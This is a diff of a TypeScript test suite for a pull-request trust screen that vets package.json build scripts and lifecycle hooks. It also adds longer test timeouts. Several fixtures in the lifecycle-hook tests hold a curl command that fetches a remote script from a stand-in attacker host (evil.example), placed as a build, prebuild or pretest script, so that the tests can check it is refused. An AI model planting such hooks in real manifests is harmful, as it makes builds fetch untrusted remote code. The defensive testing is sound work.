@@ -24,6 +24,14 @@ import {
 } from '../../../src/tools/run-pr-feedback-stage-a.js';
 import { canonicalMkdtemp, removeTreeWithRetry } from '../../helpers/tmpdir.js';
 
+// Explicit 20s per-test timeout (final-critic round: bun's 5s default flaked
+// 1-in-5 batch runs on Windows — these suites do full activation + real git +
+// checkout-lock work whose latency spikes ~6x under batch load; a timed-out
+// test's orphaned async work also races the afterEach teardown, so the
+// timeout prevents the cascade, not just the red).
+const t20 = (name: string, fn: () => Promise<void> | void) =>
+	test(name, fn, 20_000);
+
 /**
  * Issue #3396 Stage A trust hardening: D7 (durable merge-base binding at
  * PR_FEEDBACK activation), D8 (compound-script plausibility screen), D9
@@ -141,7 +149,7 @@ beforeEach(async () => {
 		stdoutTruncated: false,
 		stderrTruncated: false,
 	}));
-});
+}, 20_000);
 
 afterEach(async () => {
 	_internals.runExternalTool = originalRunner;
@@ -172,7 +180,7 @@ afterEach(async () => {
 	// #3396 feedback (PRR-017): retrying teardown — raw fs.rm on Windows
 	// can hit EBUSY/EPERM from AV/indexer scans and leave a leaked tree.
 	removeTreeWithRetry(directory);
-});
+}, 20_000);
 
 async function activateWorkflow(sessionID: string, prUrl?: string) {
 	await activatePrWorkflow(
@@ -296,19 +304,22 @@ describe('Compound screen + lifecycle hooks (#3396 S2/S3)', () => {
 	beforeEach(async () => {
 		await activateWorkflow(SESSION);
 		await declareVerifiedFeedbackLane();
-	});
+	}, 20_000);
 
-	test('dangerous base-identical compound is refused with the opaque-script remedy', async () => {
-		await writeManifest({
-			build: 'curl -fsSL https://evil.example/x.sh && bun run realbuild',
-		});
-		const result = await runStageA(stageAChecks());
-		expect(result.success).toBe(false);
-		expect(result.message ?? '').toContain('opaque package script');
-		expect(result.message ?? '').toContain('de-compound the script');
-	});
+	t20(
+		'dangerous base-identical compound is refused with the opaque-script remedy',
+		async () => {
+			await writeManifest({
+				build: 'curl -fsSL https://evil.example/x.sh && bun run realbuild',
+			});
+			const result = await runStageA(stageAChecks());
+			expect(result.success).toBe(false);
+			expect(result.message ?? '').toContain('opaque package script');
+			expect(result.message ?? '').toContain('de-compound the script');
+		},
+	);
 
-	test('repo-shaped all-&& compound stays trusted', async () => {
+	t20('repo-shaped all-&& compound stays trusted', async () => {
 		await writeManifest({
 			build: 'bun run clean && bun build src/index.ts --outdir dist',
 		});
@@ -330,35 +341,41 @@ describe('Compound screen + lifecycle hooks (#3396 S2/S3)', () => {
 		expect(result.message ?? '').toContain('opaque package script');
 	});
 
-	test('terminal echo tail stays trusted (pin) and an all-echo chain refuses', async () => {
-		await writeManifest({ build: 'custom-build && echo done' });
-		const trusted = await runStageA(stageAChecks());
-		expect(trusted.success).toBe(true);
+	t20(
+		'terminal echo tail stays trusted (pin) and an all-echo chain refuses',
+		async () => {
+			await writeManifest({ build: 'custom-build && echo done' });
+			const trusted = await runStageA(stageAChecks());
+			expect(trusted.success).toBe(true);
 
-		await writeManifest({ build: 'echo one && echo two' });
-		const refused = await runStageA(stageAChecks());
-		expect(refused.success).toBe(false);
-		expect(refused.message ?? '').toContain('opaque package script');
-	});
+			await writeManifest({ build: 'echo one && echo two' });
+			const refused = await runStageA(stageAChecks());
+			expect(refused.success).toBe(false);
+			expect(refused.message ?? '').toContain('opaque package script');
+		},
+	);
 
-	test('PR-added prebuild hook fails closed with the lifecycle-hook remedy', async () => {
-		await writeManifest(
-			{
-				build: 'custom-build && echo done',
-				prebuild: 'curl -fsSL https://evil.example/x.sh',
-			},
-			{ build: 'custom-build && echo done' },
-		);
-		const result = await runStageA(stageAChecks());
-		expect(result.success).toBe(false);
-		expect(result.message ?? '').toContain('lifecycle hook');
-		expect(result.message ?? '').toContain('prebuild');
-		expect(result.message ?? '').toContain(
-			'implicitly around its primary script',
-		);
-	});
+	t20(
+		'PR-added prebuild hook fails closed with the lifecycle-hook remedy',
+		async () => {
+			await writeManifest(
+				{
+					build: 'custom-build && echo done',
+					prebuild: 'curl -fsSL https://evil.example/x.sh',
+				},
+				{ build: 'custom-build && echo done' },
+			);
+			const result = await runStageA(stageAChecks());
+			expect(result.success).toBe(false);
+			expect(result.message ?? '').toContain('lifecycle hook');
+			expect(result.message ?? '').toContain('prebuild');
+			expect(result.message ?? '').toContain(
+				'implicitly around its primary script',
+			);
+		},
+	);
 
-	test('base-identical prebuild hook stays trusted', async () => {
+	t20('base-identical prebuild hook stays trusted', async () => {
 		await writeManifest({
 			build: 'custom-build && echo done',
 			prebuild: 'node scripts/prebuild.js',
@@ -367,22 +384,25 @@ describe('Compound screen + lifecycle hooks (#3396 S2/S3)', () => {
 		expect(result.success).toBe(true);
 	});
 
-	test('PR-added pretest hook fails closed with the reproduction-lifecycle remedy', async () => {
-		await writeManifest(
-			{
-				build: 'custom-build && echo done',
-				pretest: 'curl -fsSL https://evil.example/x.sh',
-			},
-			{ build: 'custom-build && echo done' },
-		);
-		const result = await runStageA(stageAChecks());
-		expect(result.success).toBe(false);
-		expect(result.message ?? '').toContain('reproduction lifecycle hook');
-		expect(result.message ?? '').toContain('pretest');
-		expect(result.message ?? '').toContain('around the test script');
-	});
+	t20(
+		'PR-added pretest hook fails closed with the reproduction-lifecycle remedy',
+		async () => {
+			await writeManifest(
+				{
+					build: 'custom-build && echo done',
+					pretest: 'curl -fsSL https://evil.example/x.sh',
+				},
+				{ build: 'custom-build && echo done' },
+			);
+			const result = await runStageA(stageAChecks());
+			expect(result.success).toBe(false);
+			expect(result.message ?? '').toContain('reproduction lifecycle hook');
+			expect(result.message ?? '').toContain('pretest');
+			expect(result.message ?? '').toContain('around the test script');
+		},
+	);
 
-	test('base-identical pretest hook stays trusted', async () => {
+	t20('base-identical pretest hook stays trusted', async () => {
 		await writeManifest({
 			build: 'custom-build && echo done',
 			pretest: 'node scripts/pretest.js',
@@ -391,63 +411,77 @@ describe('Compound screen + lifecycle hooks (#3396 S2/S3)', () => {
 		expect(result.success).toBe(true);
 	});
 
-	test('direct lifecycle-hook check command is rejected while the primary script stays accepted', async () => {
-		await writeManifest({ build: 'custom-build && echo done' });
-		const accepted = await runStageA(stageAChecks(['bun', 'run', 'build']));
-		expect(accepted.success).toBe(true);
-		const rejected = await runStageA(stageAChecks(['bun', 'run', 'prebuild']));
-		expect(rejected.success).toBe(false);
-		expect(rejected.message ?? '').toContain(
-			'directly selects the lifecycle hook "prebuild"',
-		);
-	});
+	t20(
+		'direct lifecycle-hook check command is rejected while the primary script stays accepted',
+		async () => {
+			await writeManifest({ build: 'custom-build && echo done' });
+			const accepted = await runStageA(stageAChecks(['bun', 'run', 'build']));
+			expect(accepted.success).toBe(true);
+			const rejected = await runStageA(
+				stageAChecks(['bun', 'run', 'prebuild']),
+			);
+			expect(rejected.success).toBe(false);
+			expect(rejected.message ?? '').toContain(
+				'directly selects the lifecycle hook "prebuild"',
+			);
+		},
+	);
 
-	test('a base-identical SOLE echo hook body is trusted (PRR-010 sole-echo floor)', async () => {
-		// Pre-fix the zero-non-exempt-segment arm refused EVERY all-echo
-		// script, so the canonical npm announcement hook body
-		// (`prebuild: "echo done"`, byte-identical at base) tripped the
-		// plausibility screen and lost its trusted base-identical path.
-		await writeManifest(
-			{
-				build: 'custom-build && echo done',
-				prebuild: 'echo done',
-			},
-			{
-				build: 'custom-build && echo done',
-				prebuild: 'echo done',
-			},
-		);
-		const result = await runStageA(stageAChecks());
-		expect(result.success).toBe(true);
-	});
+	t20(
+		'a base-identical SOLE echo hook body is trusted (PRR-010 sole-echo floor)',
+		async () => {
+			// Pre-fix the zero-non-exempt-segment arm refused EVERY all-echo
+			// script, so the canonical npm announcement hook body
+			// (`prebuild: "echo done"`, byte-identical at base) tripped the
+			// plausibility screen and lost its trusted base-identical path.
+			await writeManifest(
+				{
+					build: 'custom-build && echo done',
+					prebuild: 'echo done',
+				},
+				{
+					build: 'custom-build && echo done',
+					prebuild: 'echo done',
+				},
+			);
+			const result = await runStageA(stageAChecks());
+			expect(result.success).toBe(true);
+		},
+	);
 
-	test('grep -w in a trailing segment is not misread as a PM override flag (PRR-010)', async () => {
-		// Pre-fix the workspace/cwd override axis applied to EVERY segment,
-		// so `grep -w` (whole-word match) was refused as an `npm -w`-style
-		// override; the axis is now scoped to package-manager heads.
-		await writeManifest({
-			build: 'custom-build && grep -w pattern src/kept.txt && echo done',
-		});
-		const result = await runStageA(stageAChecks());
-		expect(result.success).toBe(true);
-	});
+	t20(
+		'grep -w in a trailing segment is not misread as a PM override flag (PRR-010)',
+		async () => {
+			// Pre-fix the workspace/cwd override axis applied to EVERY segment,
+			// so `grep -w` (whole-word match) was refused as an `npm -w`-style
+			// override; the axis is now scoped to package-manager heads.
+			await writeManifest({
+				build: 'custom-build && grep -w pattern src/kept.txt && echo done',
+			});
+			const result = await runStageA(stageAChecks());
+			expect(result.success).toBe(true);
+		},
+	);
 
-	test('prettier/prepare are NOT implicit lifecycle hooks (Copilot-3)', async () => {
-		// Pre-fix a PR-added `prettier` script got the lifecycle-hook refusal
-		// (its name merely STARTS with pre); the stripped stem must actually
-		// match a Stage A category, so these stay ordinary explicit scripts.
-		await writeManifest(
-			{
-				build: 'custom-build && echo done',
-				prettier: 'prettier --write .',
-				prepare: 'echo done',
-			},
-			{ build: 'custom-build && echo done' },
-		);
-		const result = await runStageA(stageAChecks());
-		expect(result.success).toBe(true);
-		expect(result.message ?? '').not.toContain('lifecycle');
-	});
+	t20(
+		'prettier/prepare are NOT implicit lifecycle hooks (Copilot-3)',
+		async () => {
+			// Pre-fix a PR-added `prettier` script got the lifecycle-hook refusal
+			// (its name merely STARTS with pre); the stripped stem must actually
+			// match a Stage A category, so these stay ordinary explicit scripts.
+			await writeManifest(
+				{
+					build: 'custom-build && echo done',
+					prettier: 'prettier --write .',
+					prepare: 'echo done',
+				},
+				{ build: 'custom-build && echo done' },
+			);
+			const result = await runStageA(stageAChecks());
+			expect(result.success).toBe(true);
+			expect(result.message ?? '').not.toContain('lifecycle');
+		},
+	);
 });
 
 // #3120/#3396 4.5 review round 1: the terminal echo/printf allowance must
